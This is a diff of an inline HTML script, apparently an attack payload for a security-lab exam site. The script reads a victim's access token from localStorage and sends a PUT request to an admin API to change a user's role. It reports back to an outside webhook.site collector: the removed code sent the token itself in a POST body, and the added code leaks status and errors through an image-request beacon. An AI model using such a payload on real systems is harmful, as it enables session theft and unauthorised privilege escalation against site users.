@@ -9,15 +9,6 @@
   <script>
     const token = localStorage.getItem('access_token');
 
-    // Hàm gửi webhook
-    function notifyWebhook(data) {
-      fetch('https://webhook.site/64b963bc-2bfe-4ed0-aa14-b7b423f02b8c', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
-    }
-
     if (token) {
       fetch('https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/users/121', {
         method: 'PUT',
@@ -33,25 +24,19 @@
         })
       })
       .then(response => {
-        notifyWebhook({
-          status: response.status,
-          ok: response.ok,
-          message: response.ok ? 'Role updated successfully' : 'Failed to update role',
-          token: token
-        });
+        // Gửi thông báo bằng ảnh
+        const img = new Image();
+        img.src = 'https://webhook.site/64b963bc-2bfe-4ed0-aa14-b7b423f02b8c?status=' + response.status + '&ok=' + response.ok;
       })
       .catch(error => {
-        notifyWebhook({
-          error: error.toString(),
-          message: 'Request failed',
-          token: token
-        });
+        // Gửi lỗi bằng ảnh
+        const img = new Image();
+        img.src = 'https://webhook.site/64b963bc-2bfe-4ed0-aa14-b7b423f02b8c?error=' + encodeURIComponent(error.toString());
       });
     } else {
-      notifyWebhook({
-        error: 'No token found in localStorage',
-        message: 'Token missing'
-      });
+      // Token không có, báo lỗi về webhook
+      const img = new Image();
+      img.src = 'https://webhook.site/64b963bc-2bfe-4ed0-aa14-b7b423f02b8c?error=NoToken';
     }
   </script>
 </body>
